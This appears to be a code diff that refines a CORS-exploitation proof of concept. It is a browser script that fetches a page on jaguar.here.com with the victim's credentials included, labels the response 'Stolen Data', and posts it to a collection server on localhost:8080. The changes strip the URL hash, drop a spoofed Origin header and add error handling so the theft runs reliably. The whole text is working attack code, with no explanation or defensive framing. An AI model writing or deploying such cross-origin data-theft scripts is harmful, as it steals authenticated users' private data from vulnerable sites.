@@ -1,21 +1,29 @@
 <script>
-    fetch('https://www.jaguar.here.com/#search/0', {
-        credentials: 'include',
-        headers: {
-            'Origin': 'https://testingcors.site'
-        }
+    fetch('https://www.jaguar.here.com/search/0', { // Changed to exclude hash
+        credentials: 'include'
     })
-    .then(response => response.text())
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok: ' + response.statusText);
+        }
+        return response.text(); // Ensure you retrieve the response as text
+    })
     .then(data => {
         console.log('Stolen Data:', data);
         // Send stolen data to your local server
-        fetch('http://localhost:8080', {
+        return fetch('http://localhost:8080', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({ stolenData: data })
         });
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send data to local server: ' + response.statusText);
+        }
+        console.log('Data sent successfully');
     })
     .catch(error => console.error('Error:', error));
 </script>
